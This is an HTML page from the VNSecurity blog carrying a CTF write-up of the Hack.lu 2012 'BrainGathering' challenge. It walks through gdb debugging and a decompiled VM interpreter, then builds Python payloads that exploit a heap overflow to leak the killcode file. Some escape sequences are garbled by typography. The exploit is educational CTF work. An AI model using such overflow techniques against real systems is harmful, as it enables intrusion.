@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width initial-scale=1">
+
+  <title>[writeup] Hacklu 2012 – Challenge #6 – BrainGathering – (500)</title>
+  <meta name="description" content="I did not solve this during CTF and my mistake is not using IDA to decompile since it has some obfuscate.After CTF end, i use gdb to dump running process to ...">
+  <link rel="stylesheet" href="/assets/bootstrap.css">
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://localhost:8000/ctf%20-%20clgt%20crew/2012/10/26/writeup-hacklu-2012-challenge-6-braingathering-500.html">
+  <link rel="alternate" type="application/atom+xml" title="VNSecurity" href="http://localhost:8000/feed.xml" />
+  <script type="text/javascript" src='//ajax.googleapis.com/ajax/libs/webfont/1.4.7/webfont.js?ver=3.9.2'></script>
+  <script type="text/javascript" src="/assets/jquery.js"></script>
+  <script type="text/javascript" src="/assets/jquery.caroufredsel-6.0.4-packed.js"></script>
+  <script type="text/javascript">
+    // WebFont.load({
+    //     google: {
+    //         families: ['Source+Sans+Pro','Open+Sans::latin,vietnamese']
+    //     }
+    // });
+  </script>
+</head>
+
+    <body>
+        <div class="wrapper kopa-shadow">
+            <div class="row-fluid">
+                <header id="page-header">
+    <div class="clearfix" id="header-top">
+
+        <div class="kp-headline-wrapper clearfix">
+            <h6 class="kp-headline-title">Breaking news<span></span></h6>
+            <div class="kp-headline clearfix">
+                <dl class="ticker-1 clearfix">
+                    
+                    <dd>
+                        <a href="/headlines/2014/05/06/btalk-part-1.html">Phân tích ứng dụng Btalk trên Android &#8211; Phần một: Cơ chế xác thực người dùng</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/20/hoc-vien-sans-den-viet-nam.html">Học viện SANS đến Việt Nam 03/2012</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/16/hoi-thao-tet-2012.html">Hội thảo Tết 2012</a>
+                    </dd>
+                    
+                </dl><!--ticker-1-->
+            </div><!--kp-headline-->
+        </div><!--kp-headline-wrapper-->
+
+        <div class="social-search-box">
+
+        </div>
+        <!--social-search-box-->
+
+    </div>
+    <!--header-top-->
+
+    <div class="clearfix" id="header-middle">
+        <div id="logo-image">
+            <a href="http://vnsec-new.cloudapp.net/wp">
+                <img width="217" height="70" alt="VNSecurity Logo" src="/assets/logo.png">
+            </a>
+        </div>
+        <div class="top-banner">
+
+
+        </div>
+        <!--top-banner-->
+
+    </div>
+
+    <!--header-middle-->
+
+    <div id="header-bottom">
+        <nav id="main-nav">
+            <ul class="menu clearfix sf-js-enabled sf-arrows" id="main-menu">
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/">Home</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/headlines/">headlines</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/tutorials/">tutorials</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/research/">research</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/ctf-clgt-crew/">ctf - clgt crew</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/misc/">misc</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/papers.html">Papers</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/tools.html">Tools</a>
+                </li>
+            </ul>
+        </nav>
+        <!--main-nav-->
+    </div>
+    <div>
+        
+    </div>
+    <!--header-bottom-->
+</header>
+                <div id="main-content">
+                    <div class="post type-post status-publish format-standard hentry category-tin-tuc tag-android tag-btalk tag-mobile entry-box clearfix">
+
+  <header class="post-header">
+    <h4 class="entry-title">[writeup] Hacklu 2012 – Challenge #6 – BrainGathering – (500)</h4>
+    <p class="post-meta">Oct 26, 2012 • suto</p>
+  </header>
+
+  <article class="post-content">
+    <p>I did not solve this during CTF and my mistake is not using IDA to decompile since it has some obfuscate.<br />
+After CTF end, i use gdb to dump running process to binary file and<br />
+analyze it again, try to finish it.</p>
+
+<blockquote>
+  <p>gdb –pid [PID]<br />
+gdb&gt;info proc<br />
+process 4660</p>
+
+  <p>gdb&gt;shell cat /proc/4660/maps<br />
+08048000-0804a000 rwxp 00000000 08:03 7213513</p>
+
+  <p>gdb&gt;dump out.dmp 0×08048000 0x0804a000</p>
+</blockquote>
+
+<p>Load it to IDA and decompile. Basically it will loop and get an OPCODE<br />
+from static array locate at address 0x804B060, and a action defined<br />
+by that OPCODE will be run.</p>
+
+<p>Just thinking a bit, when we input 0×36 bytes it will end up with a message:</p>
+
+<blockquote>
+  <p>==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
+Automated system for braingathering ready.</p>
+
+  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
+2) How much longer till braaaiiiiinz?<br />
+3) Nooo more brainz! STOP THE BRAINZ!</p>
+
+  <p>X) Nah, I’m going to get my brains somewhere else.</p>
+
+  <p>3<br />
+### Warning: Only for authorized zombies ###<br />
+Please enter teh z0mb13 k1llc0d3:<br />
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br />
+XPLOIT DETECTED, ALTERING KILLCODE</p>
+</blockquote>
+
+<p>In normal case when our string &lt; 0×36 bytes length:</p>
+
+<blockquote>
+  <p>==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
+Automated system for braingathering ready.</p>
+
+  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
+2) How much longer till braaaiiiiinz?<br />
+3) Nooo more brainz! STOP THE BRAINZ!</p>
+
+  <p>X) Nah, I’m going to get my brains somewhere else.</p>
+
+  <p>3<br />
+### Warning: Only for authorized zombies ###<br />
+Please enter teh z0mb13 k1llc0d3:<br />
+hello<br />
+Comparing k1llc0d3<br />
+INVALID</p>
+
+  <p>==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
+Automated system for braingathering ready</p>
+</blockquote>
+
+<p>It continue. So i think it must be a different when this vm handle<br />
+our string. The execution flow will different in 2 cases. Let find out:</p>
+
+<p>I set a breakpoint and print at 0x0804865B where it get OPCODE and put it<br />
+in to EAX register.</p>
+
+<blockquote>
+  <p>b *0x0804865B<br />
+commands 1<br />
+p/x $ebx<br />
+p/x $eax<br />
+continue<br />
+end</p>
+</blockquote>
+
+<p>Compare 2 results I have found where the execution alter:</p>
+
+<p>First one is “B”*0×36:</p>
+
+<blockquote>
+  <p>0x081ea147 71<br />
+0x081ea148 82<br />
+0x081ea149 14<br />
+0x081ea14a 53<br />
+0x081ea14d 81<br />
+0x081ea14e 40<br />
+0x081ea150 74<br />
+0x081ea151 41<br />
+0x081ea152 86<br />
+0x081ea153 68<br />
+0x081ea154 74<br />
+0x081ea155 58<br />
+0x081ea4f3 3d<br />
+0x081ea4f6 81<br />
+0x081ea4f7 3f<br />
+0x081ea4f9 53<br />
+0x081ea4fc 28</p>
+</blockquote>
+
+<p>In normal case:</p>
+
+<blockquote>
+  <p>0×08515147 71<br />
+0×08515148 82<br />
+0×08515149 14<br />
+0x0851514a 53<br />
+0x0851514d 81<br />
+0x0851514e 40<br />
+0×08515150 74<br />
+0×08515151 41<br />
+0×08515152 86<br />
+0×08515153 68<br />
+0×08515154 74<br />
+0×08515155 58<br />
+0x0851531d 58<br />
+0×08519149 53<br />
+0x0851914c 53<br />
+0x0851914f 53<br />
+0×08519152 53</p>
+</blockquote>
+
+<p>The address in 2 case will same at offset, so we can compare easy.<br />
+It start different when handle OPCODE 0×58.</p>
+
+<blockquote>
+  <p>case 0×58:<br />
+v22 = *heap1_end2;<br />
+++heap1_end2;<br />
+PC += v22;<br />
+continue;</p>
+</blockquote>
+
+<p>So v22 will change flow of execution because. I want to know why this happen:</p>
+
+<blockquote>
+  <p>gdb&gt;b *0x080487DE<br />
+gdb&gt;commands 2<br />
+&gt;p/x $ebx<br />
+&gt;continue<br />
+&gt;end</p>
+</blockquote>
+
+<p>And i end up with</p>
+
+<blockquote>
+  <p>…<br />
+..<br />
+Breakpoint 2, 0x080487de in close@plt ()<br />
+$12 = 0×4242</p>
+</blockquote>
+
+<p>Yeah, so we can control v22. Let look into hex-rays source to see why this happen:</p>
+
+<p>In OPCODE 0x3F</p>
+
+<blockquote>
+  <p>case 0x3F:<br />
+v40 = *PC++;<br />
+v41 = v4;<br />
+READ(v40, &amp;PC[v61], 0xFFFF – (unsigned __int16)((_WORD)heap1_end2 – (_WORD)PC));<br />
+v4 = v41;<br />
+continue;</p>
+</blockquote>
+
+<p>It will read our string to PC[v61] with a size result from calculation: 0xFFFF – (unsigned __int16)((_WORD)heap1_end2 – (_WORD)PC)<br />
+Since result from v22 we can understand an overflow occur, last 2 bytes of our string overwrite value at heap1_end2.<br />
+When OPCODE 0×58 is processed, PC will increase base on that 2 bytes.</p>
+
+<p>Now the time for exploitation, first we need to calculate offset beetween PC at that time and our string.</p>
+
+<blockquote>
+  <p>gdb&gt;b *0x080487DE if $ebx=0×4242<br />
+gdb&gt;c<br />
+…..<br />
+gdb&gt;x/20wx $edi-0×40<br />
+0x8343fb5: 0×00000000 0×00000000 0×00000000 0×00000000<br />
+0x8343fc5: 0x700e4242 0×00007010 0×00000000 0×42424242<br />
+0x8343fd5: 0×42424242 0×42424242 0×42424242 0×42424242<br />
+0x8343fe5: 0×42424242 0×00104242 0x7000ffc9 0x01e38010<br />
+0x8343ff5: 0×42424242 0×42424242 0×42424242 0×42424242<br />
+gdb&gt; x/x $esp+0x2c<br />
+0xffe8648c: 0×08334008<br />
+gdb&gt; p/x 0x8343fd5-0×08334008<br />
+$5 = 0xffcd</p>
+</blockquote>
+
+<p>So just to confirm i’ll return to 0×40 ( write OPCODE) :</p>
+
+<blockquote>
+  <p>python -c ‘print “3″*34+”x40″*41+”xffxcd”*7′ &gt; file</p>
+</blockquote>
+
+<p>And:</p>
+
+<blockquote>
+  <p>./braingathering &lt; file<br />
+==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
+Automated system for braingathering ready.</p>
+
+  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
+2) How much longer till braaaiiiiinz?<br />
+3) Nooo more brainz! STOP THE BRAINZ!</p>
+
+  <p>X) Nah, I’m going to get my brains somewhere else.</p>
+
+  <p>### Warning: Only for authorized zombies ###<br />
+Please enter teh z0mb13 k1llc0d3:<br />
+Comparing k1llc0d3<br />
+INVALID</p>
+
+  <p>INVALID<br />
+INVALID<br />
+INVALID<br />
+INVALID<br />
+INVALID<br />
+INVALID<br />
+zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz</p>
+</blockquote>
+
+<p>And make sure index of byte we can start our shellcode:</p>
+
+<blockquote>
+  <p>python -c ‘print “3″*34+”A”*6+”x40″+”B”*34+”xffxcd”*7′ &gt; file<br />
+./braingathering &lt; file<br />
+Comparing k1llc0d3<br />
+INVALID</p>
+
+  <p>INVALID</p>
+</blockquote>
+
+<p>In OPCODE 0×40:</p>
+
+<blockquote>
+  <p>case 0×40:<br />
+v36 = *PC++;<br />
+v37 = 2;<br />
+v63 = v4;<br />
+if ( v36 &lt;= 1u )<br />
+v37 = v36;<br />
+v38 = v37;<br />
+len = STRLEN(&amp;PC[v61]);<br />
+WRITE(v38, &amp;PC[v61], len);<br />
+v4 = v63;<br />
+continue;</p>
+</blockquote>
+
+<p>Finally. We findout where content of killcode existence in memory.<br />
+Let find where it is:</p>
+
+<blockquote>
+  <p>gdb-peda$ searchmem KILLCODE heap<br />
+Searching for ‘KILLCODE’ in: heap ranges<br />
+Found 1 results, display max 1 items:<br />
+[heap] : 0x838b008 (“KILLCODEn## Warn”)<br />
+gdb-peda$ p/x 0x838b008-0×08383008<br />
+$1 = 0×8000</p>
+</blockquote>
+
+<p>And we need to reset v61 to 0×8000 We use OPCODE 0×49</p>
+
+<blockquote>
+  <p>case 0×49:<br />
+v29 = PC[1];<br />
+v30 = *PC;<br />
+PC += 2;<br />
+v61 = (v29 « 8) | v30;<br />
+continue;</p>
+</blockquote>
+
+<p>And final exploit ( so lucky since v61 has value 0 at that time)</p>
+
+<blockquote>
+  <p>$echo “FUKCING KILLCODE” &gt; killcode</p>
+
+  <p>$python -c ‘print “3″*34+”A”*6+”x49x00x80x40″+”B”*31+”xffxcd”*7′ &gt; file<br />
+./braingathering &lt; file<br />
+==[ZOMBIE BRAIN AQUIREMENT SYSTEM]==<br />
+Automated system for braingathering ready.</p>
+
+  <p>1) Need Brainz brainz brainz, Zombie huuuungry!<br />
+2) How much longer till braaaiiiiinz?<br />
+3) Nooo more brainz! STOP THE BRAINZ!</p>
+
+  <p>X) Nah, I’m going to get my brains somewhere else.</p>
+
+  <p>### Warning: Only for authorized zombies ###<br />
+Please enter teh z0mb13 k1llc0d3:<br />
+Comparing k1llc0d3<br />
+INVALID</p>
+
+  <p>FUKCING KILLCODE</p>
+</blockquote>
+
+<p>and hex-rays source:</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl sub_80485E0()
+{
+  BYTE *PC; // esi@1 MAPDST
+  int index; // eax@1
+  _WORD *heap1_end2; // edi@3
+  int v4; // edx@3
+  char opCode; // al@4
+  int v6; // ST3C_4@5
+  unsigned __int16 v7; // ax@6
+  int v8; // eax@11
+  int v9; // esi@12
+  __int16 v10; // si@15
+  __int16 v11; // ax@15
+  char v12; // si@16
+  int v13; // ecx@16
+  unsigned __int16 v14; // cx@19
+  char v15; // si@23
+  int v16; // eax@23
+  unsigned __int16 v17; // si@26
+  __int16 v18; // si@27
+  __int16 v19; // ax@27
+  char v20; // si@30
+  int v21; // eax@30
+  int v22; // ebx@33
+  __int16 v23; // si@36
+  __int16 v24; // ax@36
+  __int16 v25; // si@37
+  __int16 v26; // ax@37
+  __int16 v27; // si@38
+  __int16 v28; // cx@38
+  __int16 v29; // ax@39
+  __int16 v30; // cx@39
+  __int16 v31; // si@45
+  __int16 v32; // ax@45
+  int v33; // ST3C_4@47
+  int v34; // ST3C_4@48
+  unsigned __int16 v35; // ax@48
+  unsigned __int16 v36; // si@50
+  signed int v37; // eax@50
+  signed int v38; // ST40_4@52
+  int len; // eax@52
+  unsigned __int16 v40; // si@53
+  int v41; // ST3C_4@53
+  __int16 v42; // si@54
+  unsigned __int16 v43; // ax@54
+  __int16 v44; // si@55
+  __int16 v45; // ax@55
+  __int16 v46; // si@57
+  __int16 v47; // ax@57
+  BYTE v48; // si@59
+  int v49; // ecx@59
+  int v50; // eax@63
+  __int16 v51; // si@67
+  unsigned __int16 v52; // ax@67
+  BYTE v53; // si@77
+  int v54; // ecx@77
+  __int16 v55; // si@80
+  __int16 v56; // ax@80
+  char v57; // si@82
+  int v58; // eax@82
+  int v59; // eax@85
+  unsigned __int16 v61; // [sp+1Eh] [bp-42h]@3
+  int v63; // [sp+3Ch] [bp-24h]@50
+  BYTE *heap1_end1; // [sp+44h] [bp-1Ch]@3
+  unsigned __int16 v65; // [sp+48h] [bp-18h]@3
+  unsigned __int16 v66; // [sp+4Ah] [bp-16h]@3
+
+  PC = (BYTE *)malloc_(65535);
+  memset_((int)PC, 0, 65535);
+  index = 0;
+  do
+  {
+    PC[index] = byte_804B060[index];
+    ++index;
+  }
+  while ( index != 2068 );
+  heap1_end1 = PC + 65535;
+  heap1_end2 = PC + 65535;
+  v4 = 0;
+  v65 = 0;
+  v66 = 0;
+  v61 = 0;
+  while ( 1 )
+  {
+    opCode = *PC++;
+    switch ( opCode )
+    {
+      default:
+        continue;
+      case 0x90:
+        v6 = v4;
+        sleep_();
+        v4 = v6;
+        continue;
+      case 0x86:
+        v7 = *heap1_end2;
+        ++heap1_end2;
+        v65 = v7;
+        continue;
+      case 0x82:
+        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
+          goto terminate_;
+        --heap1_end2;
+        *heap1_end2 = v65;
+        continue;
+      case 0x81:
+        v61 = (_WORD)heap1_end2 - (_WORD)PC;
+        continue;
+      case 0x7B:
+        v8 = v4 &amp; 0x1FFF;
+        if ( v66 == v65 )
+        {
+          v4 &amp;= 0x1FFFu;
+          BYTE1(v4) |= 0x20u;
+          v65 = v66;
+        }
+        else
+        {
+          HIWORD(v9) = HIWORD(v4);
+          LOWORD(v4) = v8 | 0x8000;
+          if ( v66 &gt;= v65 )
+          {
+            LOWORD(v9) = v8 | 0x4000;
+            v4 = v9;
+          }
+        }
+        continue;
+      case 0x79:
+        v10 = PC[1];
+        v11 = *PC;
+        PC += 2;
+        v65 -= (v10 &lt;&lt; 8) | v11;
+        continue;
+      case 0x75:
+        v12 = *PC++;
+        v13 = v4 | 0x8000;
+        LOWORD(v4) = v4 &amp; 0x7FFF;
+        if ( v12 )
+          v4 = v13;
+        continue;
+      case 0x74:
+        v14 = *heap1_end2;
+        ++heap1_end2;
+        v61 = v14;
+        continue;
+      case 0x71:
+        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
+          goto terminate_;
+        --heap1_end2;
+        *heap1_end2 = v66;
+        continue;
+      case 0x69:
+        v15 = *PC++;
+        v16 = v4 | 0x40;
+        v4 &amp;= 0xFFFFFFBFu;
+        if ( v15 )
+          v4 = v16;
+        continue;
+      case 0x68:
+        v17 = *heap1_end2;
+        ++heap1_end2;
+        v66 = v17;
+        continue;
+      case 0x66:
+        v18 = PC[1];
+        v19 = *PC;
+        PC += 2;
+        v66 = (v18 &lt;&lt; 8) | v19;
+        continue;
+      case 0x61:
+        v61 ^= (unsigned __int16)(PC[1] &lt;&lt; 8) | *PC;
+        goto LABEL_29;
+      case 0x5C:
+        v20 = *PC++;
+        v21 = v4 | 0x20;
+        v4 &amp;= 0xFFFFFFDFu;
+        if ( v20 )
+          v4 = v21;
+        continue;
+      case 0x58:
+        v22 = *heap1_end2;
+        ++heap1_end2;
+        PC += v22;
+        continue;
+      case 0x53:
+        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
+          goto terminate_;
+        v23 = PC[1];
+        --heap1_end2;
+        v24 = *PC;
+        PC += 2;
+        *heap1_end2 = (v23 &lt;&lt; 8) | v24;
+        continue;
+      case 0x4F:
+        v25 = PC[1];
+        v26 = *PC;
+        PC += 2;
+        v61 += (v25 &lt;&lt; 8) | v26;
+        continue;
+      case 0x4B:
+        v27 = PC[1];
+        v28 = *PC;
+        PC += 2;
+        v65 = (v27 &lt;&lt; 8) | v28;
+        continue;
+      case 0x49:
+        v29 = PC[1];
+        v30 = *PC;
+        PC += 2;
+        v61 = (v29 &lt;&lt; 8) | v30;
+        continue;
+      case 0x47:
+        if ( (v4 &amp; 0x2010) == 8208 || v4 &amp; 0x40 &amp;&amp; (unsigned __int16)v4 &gt;&gt; 15 || (v4 &amp; 0x4020) == 16416 )
+          PC += *PC | (PC[1] &lt;&lt; 8);
+        else
+LABEL_29:
+          PC += 2;
+        continue;
+      case 0x45:
+        v31 = PC[1];
+        v32 = *PC;
+        PC += 2;
+        v65 += (v31 &lt;&lt; 8) | v32;
+        continue;
+      case 0x43:
+        if ( v61 &gt; 2u )
+        {
+          v33 = v4;
+          close_(v61);
+          v4 = v33;
+        }
+        continue;
+      case 0x42:
+        v34 = v4;
+        v35 = OPEN(&amp;PC[v61], 0);
+        v4 = v34;
+        v61 = v35;
+        continue;
+      case 0x41:
+        v4 = *heap1_end2;
+        ++heap1_end2;
+        continue;
+      case 0x40:
+        v36 = *PC++;
+        v37 = 2;
+        v63 = v4;
+        if ( v36 &lt;= 1u )
+          v37 = v36;
+        v38 = v37;
+        len = STRLEN(&amp;PC[v61]);
+        WRITE(v38, &amp;PC[v61], len);
+        v4 = v63;
+        continue;
+      case 0x3F:
+        v40 = *PC++;
+        v41 = v4;
+        READ(v40, &amp;PC[v61], 0xFFFF - (unsigned __int16)((_WORD)heap1_end2 - (_WORD)PC));
+        v4 = v41;
+        continue;
+      case 0x3D:
+        v42 = PC[1];
+        v43 = *PC;
+        PC += 2;
+        heap1_end2 = (char *)heap1_end2 - ((unsigned __int16)(v42 &lt;&lt; 8) | v43);
+        continue;
+      case 0x3A:
+        v44 = PC[1];
+        v45 = *PC;
+        PC += 2;
+        v61 -= (v44 &lt;&lt; 8) | v45;
+        continue;
+      case 0x39:
+        v61 += v66;
+        continue;
+      case 0x36:
+        v46 = PC[1];
+        v47 = *PC;
+        PC += 2;
+        v66 += (v46 &lt;&lt; 8) | v47;
+        continue;
+      case 0x33:
+        v66 = (_WORD)heap1_end2 - (_WORD)PC;
+        continue;
+      case 0x31:
+        v48 = *PC;
+        v49 = v4;
+        ++PC;
+        BYTE1(v49) |= 0x20u;
+        BYTE1(v4) &amp;= 0xDFu;
+        if ( v48 )
+          v4 = v49;
+        continue;
+      case 0x30:
+        *(_WORD *)&amp;PC[v61] = v66;
+        continue;
+      case 0x2C:
+        v50 = v4 &amp; 0x1FFF;
+        if ( v61 == v65 )
+        {
+          v4 &amp;= 0x1FFFu;
+          BYTE1(v4) |= 0x20u;
+          v65 = v61;
+        }
+        else
+        {
+          LOWORD(v4) = v50 | 0x8000;
+          BYTE1(v50) |= 0x40u;
+          if ( v61 &gt;= v65 )
+            v4 = v50;
+        }
+        continue;
+      case 0x28:
+        v51 = PC[1];
+        v52 = *PC;
+        PC += 2;
+        heap1_end2 = (char *)heap1_end2 + ((unsigned __int16)(v51 &lt;&lt; 8) | v52);
+        continue;
+      case 0x27:
+        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
+          goto terminate_;
+        --heap1_end2;
+        *heap1_end2 = (_WORD)PC + 2 - (_WORD)PC;
+        PC += (unsigned __int16)(PC[1] &lt;&lt; 8) | *PC;
+        break;
+      case 0x25:
+        v61 -= v66;
+        break;
+      case 0x24:
+        v65 = (_WORD)heap1_end2 - (_WORD)PC;
+        break;
+      case 0x21:
+        v61 = *(_WORD *)&amp;PC[v66];
+        break;
+      case 0x20:
+        if ( (unsigned int)PC &gt; (unsigned int)heap1_end2 || (unsigned int)heap1_end2 &gt; (unsigned int)heap1_end1 )
+        {
+terminate_:
+          put_("VM PROTECTION FAIL, TERMINATING");
+          exit_(1);
+        }
+        --heap1_end2;
+        *heap1_end2 = v61;
+        break;
+      case 0x17:
+        v53 = *PC;
+        v54 = v4;
+        ++PC;
+        BYTE1(v54) |= 0x40u;
+        BYTE1(v4) &amp;= 0xBFu;
+        if ( v53 )
+          v4 = v54;
+        break;
+      case 0x16:
+        v55 = PC[1];
+        v56 = *PC;
+        PC += 2;
+        v66 -= (v55 &lt;&lt; 8) | v56;
+        break;
+      case 0x14:
+        --heap1_end2;
+        *heap1_end2 = v4;
+        break;
+      case 0xD:
+        v57 = *PC++;
+        v58 = v4 | 0x10;
+        v4 &amp;= 0xFFFFFFEFu;
+        if ( v57 )
+          v4 = v58;
+        break;
+      case 0xA:
+        v59 = v4 &amp; 0x1FFF;
+        if ( v61 == v66 )
+        {
+          v4 &amp;= 0x1FFFu;
+          BYTE1(v4) |= 0x20u;
+          v66 = v61;
+        }
+        else
+        {
+          v4 &amp;= 0x1FFFu;
+          BYTE1(v59) |= 0x40u;
+          LOWORD(v4) = v4 | 0x8000;
+          if ( v66 &lt;= v61 )
+            v4 = v59;
+        }
+        break;
+      case 0xFF:
+        return 0;
+    }
+  }
+}
+</pre>
+
+  </article>
+
+</div>
+
+<hr/>
+<h2>Comments</h2>
+<div class="fb-comments" data-href="http://localhost:8000/ctf%20-%20clgt%20crew/2012/10/26/writeup-hacklu-2012-challenge-6-braingathering-500.html" data-num-posts="4" data-width="706"></div>
+
+                </div>
+                <script type="text/javascript">
+jQuery(function() {
+    var _scroll = {
+        delay: 1000,
+        easing: 'linear',
+        items: 1,
+        duration: 0.07,
+        timeoutDuration: 0,
+        pauseOnHover: 'immediate'
+    };
+    jQuery('.ticker-1').carouFredSel({
+        width: 1000,
+        align: false,
+        items: {
+            width: 'variable',
+            height: 40,
+            visible: 1
+        },
+        scroll: _scroll
+    });
+
+    //  set carousels to be 100% wide
+    jQuery('.caroufredsel_wrapper').css('width', '100%');
+});
+</script>
+<script>
+  (function() {
+    var cx = '003844801333820630405:hlapfwpe2eq';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+        '//www.google.com/cse/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+<gcse:search></gcse:search>
+<footer class="site-footer">
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      
+    </div>
+
+  </div>
+
+</footer>
+
+            </div>
+        </div>
+        <script>(function(d, s, id) {
+          var js, fjs = d.getElementsByTagName(s)[0];
+          if (d.getElementById(id)) return;
+          js = d.createElement(s); js.id = id;
+          js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=671572696275219";
+          fjs.parentNode.insertBefore(js, fjs);
+        }(document, "script", "facebook-jssdk"));</script>
+    </body>
+</html>
